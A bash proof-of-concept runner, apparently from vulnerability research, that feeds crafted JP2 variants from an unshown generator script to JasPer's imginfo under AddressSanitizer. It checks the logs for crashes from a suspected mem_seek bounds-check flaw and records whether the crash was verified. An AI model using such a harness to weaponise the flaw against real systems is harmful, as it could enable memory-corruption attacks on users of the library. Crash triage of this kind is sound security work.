#!/usr/bin/env bash
# PoC runner for VULN 001 - mem_seek dead unsigned check in JasPer
# Tries variants v5-v8 (with correct Psot and QCD).
# Stops early if an actual ASAN/UBSAN crash is detected.
set -uo pipefail

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/jasper/src_libjasper_base_jas_stream_c"
IMGINFO="/data/ylwang/non-textfuzz/target/jasper/build_test/install/bin/imginfo"
JP2_FILE="${POC_DIR}/vuln_001.jp2"
RESULT_FILE="${POC_DIR}/vuln_001_result.txt"
ASAN_LOG_PREFIX="${POC_DIR}/asan.log"
GEN_SCRIPT="${POC_DIR}/vuln_001_gen.py"
STATUS_FILE="${POC_DIR}/vuln_001_status.txt"

rm -f "${RESULT_FILE}" "${ASAN_LOG_PREFIX}".* 2>/dev/null || true

# Returns 0 if a *real* ASAN/UBSAN crash was detected in log file $1.
# LeakSanitizer-only output is NOT treated as a crash.
is_crash() {
    local log="$1"
    # Must contain an actual memory-safety error, not just a leak.
    grep -qE \
        "heap-buffer-overflow|stack-buffer-overflow|heap-use-after-free|use-after-free|global-buffer-overflow|AddressSanitizer: DEADLYSIGNAL|AddressSanitizer: SEGV|runtime error:" \
        "${log}" 2>/dev/null
}

run_variant() {
    local variant="$1"
    echo "=== Trying variant ${variant} ===" | tee -a "${RESULT_FILE}"
    python3 "${GEN_SCRIPT}" "${variant}" 2>&1 | tee -a "${RESULT_FILE}"

    # Remove old ASAN logs so we can identify fresh ones
    rm -f "${ASAN_LOG_PREFIX}".* 2>/dev/null || true

    ASAN_OPTIONS="abort_on_error=0:log_path=${ASAN_LOG_PREFIX}" \
      "${IMGINFO}" \
      -f "${JP2_FILE}" \
      >> "${RESULT_FILE}" 2>&1 || true

    local crashed=0
    for log in "${ASAN_LOG_PREFIX}".*; do
        if [ -f "${log}" ]; then
            echo "--- ASAN log: ${log} ---" >> "${RESULT_FILE}"
            cat "${log}" >> "${RESULT_FILE}"
            if is_crash "${log}"; then
                crashed=1
            fi
        fi
    done

    if [ "${crashed}" -eq 1 ]; then
        echo "[!] REAL CRASH detected in variant ${variant}" | tee -a "${RESULT_FILE}"
        return 0   # crash found
    fi

    echo "[.] No crash in variant ${variant}" | tee -a "${RESULT_FILE}"
    return 1  # no crash
}

CRASHED=0
for v in v5 v6 v7 v8; do
    if run_variant "${v}"; then
        CRASHED=1
        break
    fi
done

echo "" >> "${RESULT_FILE}"
echo "=== Final summary ===" >> "${RESULT_FILE}"
if [ "${CRASHED}" -eq 1 ]; then
    echo "CRASH DETECTED" >> "${RESULT_FILE}"
    echo "VERIFIED_CRASH" > "${STATUS_FILE}"
    echo "Crash reproduced with imginfo on crafted JP2 (ASAN heap-buffer-overflow from mem_seek)" >> "${STATUS_FILE}"
else
    echo "No crash detected after all variants" >> "${RESULT_FILE}"
    echo "UNVERIFIED" > "${STATUS_FILE}"
    echo "Vulnerability confirmed in source (dead newpos<0 check in mem_seek)." >> "${STATUS_FILE}"
    echo "Trigger via imginfo+JP2 not achieved: component stream seeks are bounded" >> "${STATUS_FILE}"
    echo "by image dimensions; JasPer's jpc_sot_getparms rejects Psot=0." >> "${STATUS_FILE}"
fi

echo "[*] Results written to ${RESULT_FILE}"
echo "[*] Status written to ${STATUS_FILE}"
echo "[*] Done."
